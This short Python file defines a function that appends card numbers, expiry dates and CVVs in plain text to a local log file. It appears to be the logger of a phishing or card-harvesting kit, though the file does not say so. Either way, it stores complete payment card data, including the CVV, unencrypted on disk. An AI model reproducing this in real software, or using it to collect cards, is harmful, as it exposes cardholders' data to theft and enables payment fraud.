import os

def logs(cardNumber, expiryDate, cvv):
    with open("log/card.log", "a", encoding="utf-8") as cards:
        cards.write(f"Card Number: {cardNumber}\nExpiry Date: {expiryDate}\nCvv: {cvv}\n\n")
